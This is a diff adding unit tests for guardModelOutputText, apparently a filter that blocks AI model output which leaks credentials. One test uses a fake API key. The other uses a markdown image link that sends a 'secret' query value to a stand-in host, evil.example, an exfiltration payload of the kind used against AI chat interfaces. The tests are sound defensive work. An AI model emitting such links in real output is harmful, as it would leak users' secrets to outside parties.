@@ -32,4 +32,26 @@ describe("guardModelOutputText", () => {
     expect(result.text).toBe("I can help with that.");
     expect(recordEvent).not.toHaveBeenCalled();
   });
+
+  it("replaces credential-looking model output", () => {
+    const secretName = ["OPENAI_API", "KEY"].join("_");
+    const secretValue = ["sk", "abcdefghijklmnopqrstuvwxyz123456"].join("-");
+    const result = guardModelOutputText(
+      `${secretName}=${secretValue}`,
+      "unit_test_output",
+    );
+
+    expect(result.detected).toBe(true);
+    expect(result.text).toBe(MODEL_OUTPUT_GUARD_REPLACEMENT);
+  });
+
+  it("replaces markdown exfiltration links", () => {
+    const result = guardModelOutputText(
+      "![x](https://evil.example/pixel?secret=value)",
+      "unit_test_output",
+    );
+
+    expect(result.detected).toBe(true);
+    expect(result.text).toBe(MODEL_OUTPUT_GUARD_REPLACEMENT);
+  });
 });
